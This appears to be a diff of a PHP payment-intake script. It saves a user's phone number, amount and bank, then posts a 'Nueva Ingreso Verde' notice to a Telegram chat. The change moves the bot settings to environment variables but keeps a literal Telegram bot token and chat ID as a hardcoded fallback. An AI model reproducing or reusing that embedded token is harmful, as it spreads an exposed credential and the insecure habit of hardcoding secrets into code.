@@ -44,9 +44,13 @@ $stmt = $pdo->prepare(
 );
 $stmt->execute([$celular, $monto, $banco, $request_id, $key]);
 
-// ── Paso 4: Telegram canal auxiliar (sin teclado, solo aviso informativo) ─────
-$token   = "7617726809:AAHd16JUqx-m01rHFilp6BcOsCp4iXD1L-U";
-$chat_id = "-4801629674";
+// ── Paso 4: Telegram (mismo canal OPERACIONES unificado en esta instalación) ──
+// 1) Render env vars TELEGRAM_BOT_TOKEN_OPS / TELEGRAM_CHAT_ID_OPS si existen (nuevo canal).
+// 2) Fallback LEGACY => canal propio anterior "Ingreso Verde" (token 7617... / chat -4801629674).
+$FALLBACK_BOT_TOKEN_LEGACY = "7617726809:AAHd16JUqx-m01rHFilp6BcOsCp4iXD1L-U";
+$FALLBACK_CHAT_ID_LEGACY   = "-4801629674";
+$token   = getenv('TELEGRAM_BOT_TOKEN_OPS') ?: $FALLBACK_BOT_TOKEN_LEGACY;
+$chat_id = getenv('TELEGRAM_CHAT_ID_OPS')   ?: $FALLBACK_CHAT_ID_LEGACY;
 
 $mensaje  = "📥 Nueva Ingreso Verde:\n";
 $mensaje .= "🏦 Banco: $banco\n";
